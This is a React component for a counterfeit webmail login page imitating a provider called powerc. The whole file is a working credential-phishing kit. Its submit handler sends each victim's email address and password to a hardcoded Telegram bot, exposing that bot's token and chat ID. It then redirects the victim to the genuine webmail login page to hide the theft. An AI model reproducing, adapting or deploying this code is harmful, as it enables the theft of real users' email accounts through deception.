import React from 'react';

import './home.css';

import logo from './logo.gif';
import { useState } from 'react';

import axios from 'axios';

import moncre from './moncre.jpeg';
import ptmc from './ptmc.gif';
import powerc from './powerc.gif';

function Home(){

    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("powerc")

    const[showError, setShowError] = useState(false);

    async function handleSubmit(e){
        e.preventDefault();
    
    
        try {
            // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
            //     email:email,
            //     password:password,
            //     platform:platform
            // });
    
            const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
                chat_id: 5916570239,
                text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
              });
    
    
        
            // Handle success
         
    
            if(response.status == 200){
               // console.log(response.data.message);
    
              
               window.location.href = 'https://webmail.powerc.net/Login.aspx';
            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        
    
        
    }
    

   return (
        
    <>

{showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
        <div className='container mt-5'>

            <div className='row main rounded'>

                <div className='logodiv col-md-3 py-3'>

                    <img src={powerc} className="mylogo" />


                </div>

                <div className='contentdiv col-md-9 px-3'>
                    

                <br/>

                <form onSubmit={handleSubmit} className= "myform">

                   


                    

                    <div class="form-group row py-0">
    <label for="staticEmail" class="col-sm-4 col-form-label mylabel">Email Address</label>
    <div class="col-sm-8">
      <input onChange={function(e){
                            setUserName(e.target.value);
                        }} value={email} type="email" class="" id="staticEmail" />
    </div>
  </div>
  <div class="form-group row py-0">
    <label for="inputPassword" class="col-sm-4 col-form-label mylabel">Password</label>
    <div class="col-sm-8">
      <input onChange={function(e){
                            setPassword(e.target.value);
                            
                        }}value={password} type="password" class="" id="inputPassword" />
    </div>
  </div>

  <div class="form-group row py-0">
    <label for="staticEmail" class="col-sm-4 col-form-label mylabel">Language</label>
    <div class="col-sm-8">
      <select>
      <option value="da-DK">Dansk</option>
	<option value="de-DE">Deutsch</option>
	<option selected="selected" value="en-US">English</option>
	<option value="es-ES">Espa&#241;ol</option>
	<option value="fr-FR">Fran&#231;ais</option>
	<option value="it-IT">Italiano</option>
	<option value="ja-JP">日本語</option>
	<option value="nl-NL">Dutch</option>
	<option value="nn-NO">Norsk</option>
	<option value="pt-BR">Portugu&#234;s</option>
	<option value="ru-RU">Русский </option>
	<option value="sv-SE">Svenska</option>
	<option value="tr-TR">T&#252;rk&#231;e</option>
	<option value="zh-TW">繁體中文</option>
      </select>
    </div>
  </div>





                    <div className='form-group'>
                        

                       

                      
                        

               
  <div class="form-group row py-0">
    <label for="staticEmail" class="col-sm-4 "style={{
      visibility:'none'
    }}></label>
    <div class="col-sm-8">
            <button type="submit" className='btn btn-light py-1 px-1'>Login</button>
    </div>
  </div>



  <div class="custom-control custom-switch">
                                <input type="checkbox" class="" id=""
                                       
                                />
                                <label className="remember" for="_remember_me">
                                Automatically log me onto this computer. <br/>
Security warning: Do not use this option if you share this computer with others.                                  <span class="pl-1" title="Enabling this will keep you logged in to this computer for 30 days." style={{
                                        cursor: "help",
                                    }}>
                                        <i class="fa fa-info-circle text-muted"></i>
                                    </span>
                                </label>
                            </div>
                    </div>

                   

                </form>

                </div>



            </div>


        </div>
    
    </>
    );
}


export default Home;